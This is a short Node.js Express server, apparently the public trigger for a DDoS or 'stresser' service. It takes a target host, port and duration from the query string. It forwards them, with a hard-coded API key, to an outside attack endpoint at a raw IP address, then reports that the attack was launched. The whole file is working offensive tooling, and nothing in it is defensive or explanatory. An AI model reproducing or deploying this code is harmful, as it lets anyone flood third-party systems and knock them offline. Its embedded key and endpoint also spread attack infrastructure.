const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// HIDDEN API KEY - NEVER EXPOSED
const API_KEY = 'gRzSotjS6tabJ9C6tvUU0fgX5nGvrnYW';
const BASE_URL = 'http://13.232.68.73:3938/attack';

app.use(express.json());

// MAIN ROUTE - NO DASHBOARD
app.get('/', async (req, res) => {
    const { host, port, time } = req.query;

    // If any parameter missing → show error
    if (!host || !port || !time) {
        return res.status(400).send('IP parameters are missing');
    }

    // Fire attack with hidden key
    try {
        const response = await axios.get(BASE_URL, {
            params: {
                ip: host,
                port: port,
                time: time,
                key: API_KEY
            },
            timeout: 15000
        });

        // Success - show minimal response
        res.json({
            success: true,
            message: `Attack launched on ${host}:${port} for ${time}s`,
            detail: response.data
        });

    } catch (error) {
        res.status(500).json({
            success: false,
            message: error.response?.data || error.message
        });
    }
});

// Health check (optional)
app.get('/health', (req, res) => {
    res.send('FLAME AI - Active');
});

app.listen(PORT, () => {
    console.log(`🔥 FLAME trigger running on port ${PORT}`);
    console.log(`🔑 Key: ${API_KEY.substring(0,8)}... (hidden)`);
});
